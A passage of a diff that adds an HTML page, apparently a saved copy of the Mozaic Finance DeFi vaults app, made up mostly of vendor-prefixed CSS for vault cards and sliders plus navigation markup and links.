+            -moz-box-orient: vertical;
+            -moz-box-direction: normal;
+            -ms-flex-direction: column;
+            flex-direction: column;
+            gap: 12px
+        }
+
+        .title.jsx-2515314420 {
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-orient: horizontal;
+            -webkit-box-direction: normal;
+            -webkit-flex-direction: row;
+            -moz-box-orient: horizontal;
+            -moz-box-direction: normal;
+            -ms-flex-direction: row;
+            flex-direction: row;
+            -webkit-box-pack: justify;
+            -webkit-justify-content: space-between;
+            -moz-box-pack: justify;
+            -ms-flex-pack: justify;
+            justify-content: space-between;
+            -webkit-box-align: center;
+            -webkit-align-items: center;
+            -moz-box-align: center;
+            -ms-flex-align: center;
+            align-items: center;
+            position: relative
+        }
+
+        .filter.jsx-2515314420 {
+            -webkit-filter: invert(1);
+            filter: invert(1)
+        }
+
+        .title-icon-wrapper.jsx-2515314420 {
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-pack: center;
+            -webkit-justify-content: center;
+            -moz-box-pack: center;
+            -ms-flex-pack: center;
+            justify-content: center;
+            -webkit-box-align: center;
+            -webkit-align-items: center;
+            -moz-box-align: center;
+            -ms-flex-align: center;
+            align-items: center;
+            width: 48px;
+            height: 48px;
+            -webkit-border-radius: 8px;
+            -moz-border-radius: 8px;
+            border-radius: 8px;
+            border: 1px solid #2EBAC6;
+            background-color: #2EBAC630;
+            position: absolute;
+            right: 0;
+            bottom: 5px
+        }
+
+        .coin-wrapper.jsx-2515314420 {
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-orient: horizontal;
+            -webkit-box-direction: normal;
+            -webkit-flex-direction: row;
+            -moz-box-orient: horizontal;
+            -moz-box-direction: normal;
+            -ms-flex-direction: row;
+            flex-direction: row;
+            gap: 10px
+        }
+
+        .coin-Theseus.jsx-2515314420 {
+            gap: 4px;
+            overflow: auto
+        }
+
+        .coin-Theseus.jsx-2515314420::-webkit-scrollbar-track {
+            position: absolute;
+            background: transparent
+        }
+
+        .coin-Theseus.jsx-2515314420::-webkit-scrollbar {
+            background: transparent;
+            position: absolute;
+            height: 2px
+        }
+
+        .coin-Theseus.jsx-2515314420::-webkit-scrollbar-thumb {
+            -webkit-border-radius: 10px;
+            -moz-border-radius: 10px;
+            border-radius: 10px;
+            background: var(--textSecondary);
+            height: 2px;
+            opacity: .3
+        }
+
+        .coin.jsx-2515314420 {
+            width: 32px;
+            height: 32px;
+            -o-object-fit: contain;
+            object-fit: contain
+        }
+    </style>
+    <style type="text/css" data-styled-jsx="">
+        .apy-container.jsx-57c757670cf8c4f1 {
+            padding: 16px;
+            width: 100%;
+            border: 2px solid var(--outlinePrimary);
+            -webkit-border-radius: 8px;
+            -moz-border-radius: 8px;
+            border-radius: 8px
+        }
+    </style>
+    <style type="text/css" data-styled-jsx="">
+        .slider-container.jsx-1523582753 {
+            width: 100%;
+            height: 4px;
+            -webkit-border-radius: 2px;
+            -moz-border-radius: 2px;
+            border-radius: 2px;
+            background-color: var(--outlinePrimary)
+        }
+
+        .progress.jsx-1523582753 {
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-align: center;
+            -webkit-align-items: center;
+            -moz-box-align: center;
+            -ms-flex-align: center;
+            align-items: center;
+            position: relative;
+            height: 100%;
+            width: 0%;
+            background-color: var(--primary)
+        }
+
+        .handle.jsx-1523582753 {
+            position: absolute;
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-align: center;
+            -webkit-align-items: center;
+            -moz-box-align: center;
+            -ms-flex-align: center;
+            align-items: center;
+            -webkit-box-pack: center;
+            -webkit-justify-content: center;
+            -moz-box-pack: center;
+            -ms-flex-pack: center;
+            justify-content: center;
+            height: 14px;
+            width: 14px;
+            -webkit-border-radius: 10px;
+            -moz-border-radius: 10px;
+            border-radius: 10px;
+            background-color: var(--primary);
+            right: -7px
+        }
+
+        .inner.jsx-1523582753 {
+            width: 60%;
+            height: 60%;
+            background-color: var(--textPrimary);
+            -webkit-border-radius: 5px;
+            -moz-border-radius: 5px;
+            border-radius: 5px;
+            -webkit-box-shadow: 0 3px 4px rgba(0, 0, 0, .34);
+            -moz-box-shadow: 0 3px 4px rgba(0, 0, 0, .34);
+            box-shadow: 0 3px 4px rgba(0, 0, 0, .34)
+        }
+    </style>
+    <style type="text/css" data-styled-jsx="">
+        .current-dep-container.jsx-1801312144 {
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-orient: vertical;
+            -webkit-box-direction: normal;
+            -webkit-flex-direction: column;
+            -moz-box-orient: vertical;
+            -moz-box-direction: normal;
+            -ms-flex-direction: column;
+            flex-direction: column;
+            gap: 12px
+        }
+
+        .label-wrapper.jsx-1801312144 {
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-pack: justify;
+            -webkit-justify-content: space-between;
+            -moz-box-pack: justify;
+            -ms-flex-pack: justify;
+            justify-content: space-between;
+            -webkit-box-align: center;
+            -webkit-align-items: center;
+            -moz-box-align: center;
+            -ms-flex-align: center;
+            align-items: center
+        }
+
+        .price-change.jsx-1801312144 {
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-align: center;
+            -webkit-align-items: center;
+            -moz-box-align: center;
+            -ms-flex-align: center;
+            align-items: center;
+            -webkit-box-pack: center;
+            -webkit-justify-content: center;
+            -moz-box-pack: center;
+            -ms-flex-pack: center;
+            justify-content: center;
+            gap: 4px
+        }
+
+        .price-change-counter.jsx-1801312144 {
+            color: var(--textPrimary);
+            text-align: right
+        }
+
+        h4.jsx-1801312144 {
+            text-align: right
+        }
+
+        .chain-wrapper.jsx-1801312144 {
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-orient: horizontal;
+            -webkit-box-direction: normal;
+            -webkit-flex-direction: row;
+            -moz-box-orient: horizontal;
+            -moz-box-direction: normal;
+            -ms-flex-direction: row;
+            flex-direction: row;
+            gap: 6px
+        }
+
+        .chain.jsx-1801312144 {
+            width: 32px;
+            height: 32px;
+            -o-object-fit: contain;
+            object-fit: contain
+        }
+    </style>
+    <style type="text/css" data-styled-jsx="">
+        .position-container.jsx-445c2380aa2dd58a {
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-orient: vertical;
+            -webkit-box-direction: normal;
+            -webkit-flex-direction: column;
+            -moz-box-orient: vertical;
+            -moz-box-direction: normal;
+            -ms-flex-direction: column;
+            flex-direction: column;
+            gap: 12px;
+            border-bottom: 1px solid var(--outlinePrimary);
+            padding-bottom: 12px
+        }
+
+        .position-info-wrapper.jsx-445c2380aa2dd58a {
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-pack: justify;
+            -webkit-justify-content: space-between;
+            -moz-box-pack: justify;
+            -ms-flex-pack: justify;
+            justify-content: space-between;
+            -webkit-box-align: center;
+            -webkit-align-items: center;
+            -moz-box-align: center;
+            -ms-flex-align: center;
+            align-items: center
+        }
+    </style>
+    <style type="text/css" data-styled-jsx="">
+        .vault-card-container.jsx-771080239 {
+            position: relative;
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-orient: vertical;
+            -webkit-box-direction: normal;
+            -webkit-flex-direction: column;
+            -moz-box-orient: vertical;
+            -moz-box-direction: normal;
+            -ms-flex-direction: column;
+            flex-direction: column;
+            max-width: 400px;
+            width: 100%;
+            height: 530px;
+            margin-top: 60px;
+            padding: 20px;
+            padding-top: 48px;
+            -webkit-border-radius: 15px;
+            -moz-border-radius: 15px;
+            border-radius: 15px;
+            background-color: var(--cardBgPrimary);
+            gap: 30px;
+            cursor: pointer;
+            border: 2px solid var(--cardBgPrimary);
+            -webkit-transition: all.2s ease;
+            -moz-transition: all.2s ease;
+            -o-transition: all.2s ease;
+            transition: all.2s ease;
+            -webkit-box-pack: justify;
+            -webkit-justify-content: space-between;
+            -moz-box-pack: justify;
+            -ms-flex-pack: justify;
+            justify-content: space-between;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none
+        }
+
+        section.jsx-771080239 {
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-orient: vertical;
+            -webkit-box-direction: normal;
+            -webkit-flex-direction: column;
+            -moz-box-orient: vertical;
+            -moz-box-direction: normal;
+            -ms-flex-direction: column;
+            flex-direction: column;
+            gap: 30px
+        }
+
+        .theseus-card.jsx-771080239 {
+            position: relative
+        }
+
+        .coming-soon.jsx-771080239 {
+            position: absolute;
+            width: 80px;
+            height: 80px;
+            bottom: -40px;
+            right: -30px
+        }
+
+        .coming-soon.jsx-771080239 img.jsx-771080239 {
+            -webkit-border-radius: 50%;
+            -moz-border-radius: 50%;
+            border-radius: 50%;
+            position: absolute;
+            width: 80px
+        }
+
+        @media screen and (max-width:520px) {
+            .coming-soon.jsx-771080239 {
+                display: none
+            }
+        }
+
+        .vault-card-container.jsx-771080239:hover {
+            -webkit-box-shadow: 0px 20px 50px -16px #2EBAC680;
+            -moz-box-shadow: 0px 20px 50px -16px #2EBAC680;
+            box-shadow: 0px 20px 50px -16px #2EBAC680;
+            -webkit-transform: scale(1.0125);
+            -moz-transform: scale(1.0125);
+            -ms-transform: scale(1.0125);
+            -o-transform: scale(1.0125);
+            transform: scale(1.0125)
+        }
+
+        .vault-card-container.jsx-771080239:active {
+            -webkit-box-shadow: 0px 14px 20px -16px #2EBAC630;
+            -moz-box-shadow: 0px 14px 20px -16px #2EBAC630;
+            box-shadow: 0px 14px 20px -16px #2EBAC630;
+            z-index: 1;
+            -webkit-transform: scale(1);
+            -moz-transform: scale(1);
+            -ms-transform: scale(1);
+            -o-transform: scale(1);
+            transform: scale(1);
+            border: 2px solid #2EBAC6
+        }
+
+        .vault-icon-wrapper.jsx-771080239 {
+            position: absolute;
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-align: center;
+            -webkit-align-items: center;
+            -moz-box-align: center;
+            -ms-flex-align: center;
+            align-items: center;
+            -webkit-box-pack: center;
+            -webkit-justify-content: center;
+            -moz-box-pack: center;
+            -ms-flex-pack: center;
+            justify-content: center;
+            width: 82px;
+            height: 82px;
+            -webkit-border-radius: 40px;
+            -moz-border-radius: 40px;
+            border-radius: 40px;
+            background-color: var(--bg);
+            top: -40px;
+            -webkit-transition: all.2s ease;
+            -moz-transition: all.2s ease;
+            -o-transition: all.2s ease;
+            transition: all.2s ease
+        }
+
+        .vault-card-container.jsx-771080239:active>.vault-icon-wrapper.jsx-771080239 {
+            background-color: #2EBAC6
+        }
+
+        .vault-icon.jsx-771080239 {
+            width: 72px;
+            height: 72px
+        }
+
+        .gradient-overlay.jsx-771080239 {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            min-height: 130px;
+            opacity: .3;
+            background: -webkit-linear-gradient(268.36deg, #2EBAC6 1.4%, #2EBAC600 98.6%);
+            background: -moz-linear-gradient(268.36deg, #2EBAC6 1.4%, #2EBAC600 98.6%);
+            background: -o-linear-gradient(268.36deg, #2EBAC6 1.4%, #2EBAC600 98.6%);
+            background: linear-gradient(181.64deg, #2EBAC6 1.4%, #2EBAC600 98.6%);
+            -webkit-border-radius: 15px 15px 0px 0px;
+            -moz-border-radius: 15px 15px 0px 0px;
+            border-radius: 15px 15px 0px 0px
+        }
+    </style>
+    <style type="text/css" data-styled-jsx="">
+        .tooltip {
+            background-color: black;
+            max-width: 200px;
+            color: var(--textPrimary) !important;
+            -webkit-border-radius: 4px;
+            -moz-border-radius: 4px;
+            border-radius: 4px;
+            padding: 8px 12px;
+            font-size: 12px;
+            line-height: 16px;
+            font-weight: 400;
+            white-space: pre-wrap
+        }
+    </style>
+    <style type="text/css" data-styled-jsx="">
+        .title-wrapper.jsx-2796969588 {
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-orient: vertical;
+            -webkit-box-direction: normal;
+            -webkit-flex-direction: column;
+            -moz-box-orient: vertical;
+            -moz-box-direction: normal;
+            -ms-flex-direction: column;
+            flex-direction: column;
+            gap: 12px
+        }
+
+        .title.jsx-2796969588 {
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-orient: horizontal;
+            -webkit-box-direction: normal;
+            -webkit-flex-direction: row;
+            -moz-box-orient: horizontal;
+            -moz-box-direction: normal;
+            -ms-flex-direction: row;
+            flex-direction: row;
+            -webkit-box-pack: justify;
+            -webkit-justify-content: space-between;
+            -moz-box-pack: justify;
+            -ms-flex-pack: justify;
+            justify-content: space-between;
+            -webkit-box-align: center;
+            -webkit-align-items: center;
+            -moz-box-align: center;
+            -ms-flex-align: center;
+            align-items: center;
+            position: relative
+        }
+
+        .filter.jsx-2796969588 {
+            -webkit-filter: invert(1);
+            filter: invert(1)
+        }
+
+        .title-icon-wrapper.jsx-2796969588 {
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-pack: center;
+            -webkit-justify-content: center;
+            -moz-box-pack: center;
+            -ms-flex-pack: center;
+            justify-content: center;
+            -webkit-box-align: center;
+            -webkit-align-items: center;
+            -moz-box-align: center;
+            -ms-flex-align: center;
+            align-items: center;
+            width: 48px;
+            height: 48px;
+            -webkit-border-radius: 8px;
+            -moz-border-radius: 8px;
+            border-radius: 8px;
+            border: 1px solid #8c34fa;
+            background-color: #8c34fa30;
+            position: absolute;
+            right: 0;
+            bottom: 5px
+        }
+
+        .coin-wrapper.jsx-2796969588 {
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-orient: horizontal;
+            -webkit-box-direction: normal;
+            -webkit-flex-direction: row;
+            -moz-box-orient: horizontal;
+            -moz-box-direction: normal;
+            -ms-flex-direction: row;
+            flex-direction: row;
+            gap: 10px
+        }
+
+        .coin-Theseus.jsx-2796969588 {
+            gap: 4px;
+            overflow: auto
+        }
+
+        .coin-Theseus.jsx-2796969588::-webkit-scrollbar-track {
+            position: absolute;
+            background: transparent
+        }
+
+        .coin-Theseus.jsx-2796969588::-webkit-scrollbar {
+            background: transparent;
+            position: absolute;
+            height: 2px
+        }
+
+        .coin-Theseus.jsx-2796969588::-webkit-scrollbar-thumb {
+            -webkit-border-radius: 10px;
+            -moz-border-radius: 10px;
+            border-radius: 10px;
+            background: var(--textSecondary);
+            height: 2px;
+            opacity: .3
+        }
+
+        .coin.jsx-2796969588 {
+            width: 32px;
+            height: 32px;
+            -o-object-fit: contain;
+            object-fit: contain
+        }
+    </style>
+    <style type="text/css" data-styled-jsx="">
+        .vault-card-container.jsx-2220230959 {
+            position: relative;
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-orient: vertical;
+            -webkit-box-direction: normal;
+            -webkit-flex-direction: column;
+            -moz-box-orient: vertical;
+            -moz-box-direction: normal;
+            -ms-flex-direction: column;
+            flex-direction: column;
+            max-width: 400px;
+            width: 100%;
+            height: 530px;
+            margin-top: 60px;
+            padding: 20px;
+            padding-top: 48px;
+            -webkit-border-radius: 15px;
+            -moz-border-radius: 15px;
+            border-radius: 15px;
+            background-color: var(--cardBgPrimary);
+            gap: 30px;
+            cursor: pointer;
+            border: 2px solid var(--cardBgPrimary);
+            -webkit-transition: all.2s ease;
+            -moz-transition: all.2s ease;
+            -o-transition: all.2s ease;
+            transition: all.2s ease;
+            -webkit-box-pack: justify;
+            -webkit-justify-content: space-between;
+            -moz-box-pack: justify;
+            -ms-flex-pack: justify;
+            justify-content: space-between;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none
+        }
+
+        section.jsx-2220230959 {
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-orient: vertical;
+            -webkit-box-direction: normal;
+            -webkit-flex-direction: column;
+            -moz-box-orient: vertical;
+            -moz-box-direction: normal;
+            -ms-flex-direction: column;
+            flex-direction: column;
+            gap: 30px
+        }
+
+        .theseus-card.jsx-2220230959 {
+            position: relative
+        }
+
+        .coming-soon.jsx-2220230959 {
+            position: absolute;
+            width: 80px;
+            height: 80px;
+            bottom: -40px;
+            right: -30px
+        }
+
+        .coming-soon.jsx-2220230959 img.jsx-2220230959 {
+            -webkit-border-radius: 50%;
+            -moz-border-radius: 50%;
+            border-radius: 50%;
+            position: absolute;
+            width: 80px
+        }
+
+        @media screen and (max-width:520px) {
+            .coming-soon.jsx-2220230959 {
+                display: none
+            }
+        }
+
+        .vault-card-container.jsx-2220230959:hover {
+            -webkit-box-shadow: 0px 20px 50px -16px #8c34fa80;
+            -moz-box-shadow: 0px 20px 50px -16px #8c34fa80;
+            box-shadow: 0px 20px 50px -16px #8c34fa80;
+            -webkit-transform: scale(1.0125);
+            -moz-transform: scale(1.0125);
+            -ms-transform: scale(1.0125);
+            -o-transform: scale(1.0125);
+            transform: scale(1.0125)
+        }
+
+        .vault-card-container.jsx-2220230959:active {
+            -webkit-box-shadow: 0px 14px 20px -16px #8c34fa30;
+            -moz-box-shadow: 0px 14px 20px -16px #8c34fa30;
+            box-shadow: 0px 14px 20px -16px #8c34fa30;
+            z-index: 1;
+            -webkit-transform: scale(1);
+            -moz-transform: scale(1);
+            -ms-transform: scale(1);
+            -o-transform: scale(1);
+            transform: scale(1);
+            border: 2px solid #8c34fa
+        }
+
+        .vault-icon-wrapper.jsx-2220230959 {
+            position: absolute;
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-align: center;
+            -webkit-align-items: center;
+            -moz-box-align: center;
+            -ms-flex-align: center;
+            align-items: center;
+            -webkit-box-pack: center;
+            -webkit-justify-content: center;
+            -moz-box-pack: center;
+            -ms-flex-pack: center;
+            justify-content: center;
+            width: 82px;
+            height: 82px;
+            -webkit-border-radius: 40px;
+            -moz-border-radius: 40px;
+            border-radius: 40px;
+            background-color: var(--bg);
+            top: -40px;
+            -webkit-transition: all.2s ease;
+            -moz-transition: all.2s ease;
+            -o-transition: all.2s ease;
+            transition: all.2s ease
+        }
+
+        .vault-card-container.jsx-2220230959:active>.vault-icon-wrapper.jsx-2220230959 {
+            background-color: #8c34fa
+        }
+
+        .vault-icon.jsx-2220230959 {
+            width: 72px;
+            height: 72px
+        }
+
+        .gradient-overlay.jsx-2220230959 {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            min-height: 130px;
+            opacity: .3;
+            background: -webkit-linear-gradient(268.36deg, #8c34fa 1.4%, #8c34fa00 98.6%);
+            background: -moz-linear-gradient(268.36deg, #8c34fa 1.4%, #8c34fa00 98.6%);
+            background: -o-linear-gradient(268.36deg, #8c34fa 1.4%, #8c34fa00 98.6%);
+            background: linear-gradient(181.64deg, #8c34fa 1.4%, #8c34fa00 98.6%);
+            -webkit-border-radius: 15px 15px 0px 0px;
+            -moz-border-radius: 15px 15px 0px 0px;
+            border-radius: 15px 15px 0px 0px
+        }
+    </style>
+    <style type="text/css" data-styled-jsx="">
+        .slider-container.jsx-2621075315 {
+            width: 100%;
+            height: 4px;
+            -webkit-border-radius: 2px;
+            -moz-border-radius: 2px;
+            border-radius: 2px;
+            background-color: var(--outlinePrimary)
+        }
+
+        .progress.jsx-2621075315 {
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-align: center;
+            -webkit-align-items: center;
+            -moz-box-align: center;
+            -ms-flex-align: center;
+            align-items: center;
+            position: relative;
+            height: 100%;
+            width: 86.2825671179%;
+            background-color: var(--primary)
+        }
+
+        .handle.jsx-2621075315 {
+            position: absolute;
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-align: center;
+            -webkit-align-items: center;
+            -moz-box-align: center;
+            -ms-flex-align: center;
+            align-items: center;
+            -webkit-box-pack: center;
+            -webkit-justify-content: center;
+            -moz-box-pack: center;
+            -ms-flex-pack: center;
+            justify-content: center;
+            height: 14px;
+            width: 14px;
+            -webkit-border-radius: 10px;
+            -moz-border-radius: 10px;
+            border-radius: 10px;
+            background-color: var(--primary);
+            right: -7px
+        }
+
+        .inner.jsx-2621075315 {
+            width: 60%;
+            height: 60%;
+            background-color: var(--textPrimary);
+            -webkit-border-radius: 5px;
+            -moz-border-radius: 5px;
+            border-radius: 5px;
+            -webkit-box-shadow: 0 3px 4px rgba(0, 0, 0, .34);
+            -moz-box-shadow: 0 3px 4px rgba(0, 0, 0, .34);
+            box-shadow: 0 3px 4px rgba(0, 0, 0, .34)
+        }
+    </style>
+
+</head>
+
+<body><noscript><iframe src="index_1.html" height="0" width="0" style="display:none;visibility:hidden"
+            title="Google Tag Manager"></iframe></noscript>
+    <div id="__next">
+        <div class="Toastify"></div>
+        <div data-rk="">
+            <style>
+                [data-rk] {
+                    --rk-blurs-modalOverlay: blur(4px);
+                    --rk-fonts-body: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
+                    --rk-radii-actionButton: 4px;
+                    --rk-radii-connectButton: 4px;
+                    --rk-radii-menuButton: 4px;
+                    --rk-radii-modal: 8px;
+                    --rk-radii-modalMobile: 8px;
+                    --rk-colors-accentColor: #7b3fe4;
+                    --rk-colors-accentColorForeground: white;
+                    --rk-colors-actionButtonBorder: rgba(255, 255, 255, 0.04);
+                    --rk-colors-actionButtonBorderMobile: rgba(255, 255, 255, 0.08);
+                    --rk-colors-actionButtonSecondaryBackground: rgba(255, 255, 255, 0.08);
+                    --rk-colors-closeButton: rgba(224, 232, 255, 0.6);
+                    --rk-colors-closeButtonBackground: rgba(255, 255, 255, 0.08);
+                    --rk-colors-connectButtonBackground: #1A1B1F;
+                    --rk-colors-connectButtonBackgroundError: #FF494A;
+                    --rk-colors-connectButtonInnerBackground: linear-gradient(0deg, rgba(255, 255, 255, 0.075), rgba(255, 255, 255, 0.15));
+                    --rk-colors-connectButtonText: #FFF;
+                    --rk-colors-connectButtonTextError: #FFF;
+                    --rk-colors-connectionIndicator: #30E000;
+                    --rk-colors-downloadBottomCardBackground: linear-gradient(126deg, rgba(0, 0, 0, 0) 9.49%, rgba(120, 120, 120, 0.2) 71.04%), #1A1B1F;
+                    --rk-colors-downloadTopCardBackground: linear-gradient(126deg, rgba(120, 120, 120, 0.2) 9.49%, rgba(0, 0, 0, 0) 71.04%), #1A1B1F;
+                    --rk-colors-error: #FF494A;
+                    --rk-colors-generalBorder: rgba(255, 255, 255, 0.08);
+                    --rk-colors-generalBorderDim: rgba(255, 255, 255, 0.04);
+                    --rk-colors-menuItemBackground: rgba(224, 232, 255, 0.1);
+                    --rk-colors-modalBackdrop: rgba(0, 0, 0, 0.5);
+                    --rk-colors-modalBackground: #1A1B1F;
+                    --rk-colors-modalBorder: rgba(255, 255, 255, 0.08);
+                    --rk-colors-modalText: #FFF;
+                    --rk-colors-modalTextDim: rgba(224, 232, 255, 0.3);
+                    --rk-colors-modalTextSecondary: rgba(255, 255, 255, 0.6);
+                    --rk-colors-profileAction: rgba(224, 232, 255, 0.1);
+                    --rk-colors-profileActionHover: rgba(224, 232, 255, 0.2);
+                    --rk-colors-profileForeground: rgba(224, 232, 255, 0.05);
+                    --rk-colors-selectedOptionBorder: rgba(224, 232, 255, 0.1);
+                    --rk-colors-standby: #FFD641;
+                    --rk-shadows-connectButton: 0px 4px 12px rgba(0, 0, 0, 0.1);
+                    --rk-shadows-dialog: 0px 8px 32px rgba(0, 0, 0, 0.32);
+                    --rk-shadows-profileDetailsAction: 0px 2px 6px rgba(37, 41, 46, 0.04);
+                    --rk-shadows-selectedOption: 0px 2px 6px rgba(0, 0, 0, 0.24);
+                    --rk-shadows-selectedWallet: 0px 2px 6px rgba(0, 0, 0, 0.24);
+                    --rk-shadows-walletLogo: 0px 2px 16px rgba(0, 0, 0, 0.16);
+                }
+            </style><img src="bg.grain.png" alt="" class="jsx-c13b0b187ed0422 overlay-body"><img src="bg.overlay.png"
+                alt="" class="jsx-c13b0b187ed0422 overlay-top"><img src="bg.overlay.png" alt=""
+                class="jsx-c13b0b187ed0422 overlay-bottom">
+            <main class="jsx-c13b0b187ed0422 container">
+                <div class="jsx-978c383ab44cb7ff nav-container">
+                    <div class="jsx-978c383ab44cb7ff nav-content-wrapper">
+                        <section class="jsx-978c383ab44cb7ff col logo-wrapper"><a href="">
+                                <div class="jsx-978c383ab44cb7ff"><img src="logo.mozaic.png" alt=""
+                                        class="jsx-978c383ab44cb7ff desktop-logo logo"><img src="logo.mozaic.png" alt=""
+                                        class="jsx-978c383ab44cb7ff mobile-logo logo"></div>
+                            </a></section>
+                        <section class="jsx-978c383ab44cb7ff col nav-btn-wrapper">
+                            <div class="jsx-978c383ab44cb7ff nav-btn active">Vaults</div>
+                            <div class="jsx-978c383ab44cb7ff nav-btn ">xMOZ</div>
+                            <div class="jsx-978c383ab44cb7ff nav-btn ">Buy</div>
+                            <div class="jsx-978c383ab44cb7ff nav-btn ">DAO</div>
+                            <div class="jsx-978c383ab44cb7ff nav-btn ">Analytics</div>
+                        </section>
+                        <section class="jsx-978c383ab44cb7ff col menu-wrapper">
+                            <div style="" class="jsx-e6f1807156ce6ac7"></div>
+                            <div>
+                                <div class="jsx-8cffebfda52c1bb3 menu-btn-container">
+                                    <div class="jsx-8cffebfda52c1bb3 hover-bg"></div><img src="ico.menu.btn.svg" alt=""
+                                        class="jsx-8cffebfda52c1bb3">
+                                    <div class="jsx-8cffebfda52c1bb3 desktop-menu-wrapper"></div>
+                                </div>
+                            </div>
+                            <div class="jsx-8cffebfda52c1bb3 mobile-menu-wrapper">
+                                <div class="jsx-564cfe45b5b70de8 mobile-menu-container false">
+                                    <section class="jsx-564cfe45b5b70de8 nav-btn-wrapper"><a href="">
+                                            <div class="jsx-564cfe45b5b70de8 nav-btn active">Vaults</div>
+                                        </a><a href="https://app.mozaic.finance/xmoz">
+                                            <div class="jsx-564cfe45b5b70de8 nav-btn ">xMOZ</div>
+                                        </a><a href="https://app.mozaic.finance/buy">
+                                            <div class="jsx-564cfe45b5b70de8 nav-btn ">Buy</div>
+                                        </a><a href="https://snapshot.org/#/mozaicfinance.eth">
+                                            <div class="jsx-564cfe45b5b70de8 nav-btn ">DAO</div>
+                                        </a><a href="https://dune.com/officialmozaic/moz-xmoz-dashboard">
+                                            <div class="jsx-564cfe45b5b70de8 nav-btn ">Analytics</div>
+                                        </a></section>
+                                    <section class="jsx-564cfe45b5b70de8 nav-menu-item-wrapper"><a
+                                            style="width:100%;height:60px" target="_blank"
+                                            href="https://mozaic.finance/">
+                                            <div class="jsx-564cfe45b5b70de8 menu-item-wrapper"><img
+                                                    src="ico.menu.home.svg" alt="" class="jsx-564cfe45b5b70de8">
+                                                <p class="jsx-564cfe45b5b70de8">Mozaic</p>
+                                            </div>
+                                        </a>
+                                        <div class="jsx-564cfe45b5b70de8 menu-item-wrapper"><img
+                                                src="ico.menu.feedback.svg" alt="" class="jsx-564cfe45b5b70de8">
+                                            <p class="jsx-564cfe45b5b70de8">Help Request</p>
+                                        </div>
+                                        <div class="jsx-564cfe45b5b70de8 menu-item-wrapper"><img src="ico.menu.bug.svg"
+                                                alt="" class="jsx-564cfe45b5b70de8">
+                                            <p class="jsx-564cfe45b5b70de8">Bug Report</p>
+                                        </div><a style="width:100%;height:60px" target="_blank"
+                                            href="https://docs.mozaic.finance/">
+                                            <div class="jsx-564cfe45b5b70de8 menu-item-wrapper"><img
+                                                    src="ico.menu.user.svg" alt="" class="jsx-564cfe45b5b70de8">
+                                                <p class="jsx-564cfe45b5b70de8">Docs</p>
+                                            </div>
+                                        </a>
+                                    </section>
+                                </div>
+                            </div>
+                        </section>
+                    </div>
+                </div>
+                <div class="jsx-c13b0b187ed0422 app-container">
+                    <main class="jsx-edda1c3fa36d050f products-container">
+                        <div class="jsx-6369883e488dae65 page-title-container">
+                            <div class="jsx-6369883e488dae65 title">
+                                <h1 class="jsx-6369883e488dae65">Vaults</h1>
+                            </div>
+                            <p class="jsx-e436ac312c9d6f3d description">Automatic and intelligent multi-chain yield
+                                farming.<a href="https://docs.mozaic.finance/" target="_blank"
+                                    class="jsx-e436ac312c9d6f3d learn-more">Learn more<!-- --> <img src="ico.next.svg"
+                                        class="jsx-e436ac312c9d6f3d"></a></p>
+                        </div>
+                        <div class="jsx-a2c087894cbbcc30 vault-list-container">
+                            <div class="jsx-ab73bcb2f1575da3 jsx-2220230959 theseus-card">
+                                <div style="max-width: 400px; width: 100%;"
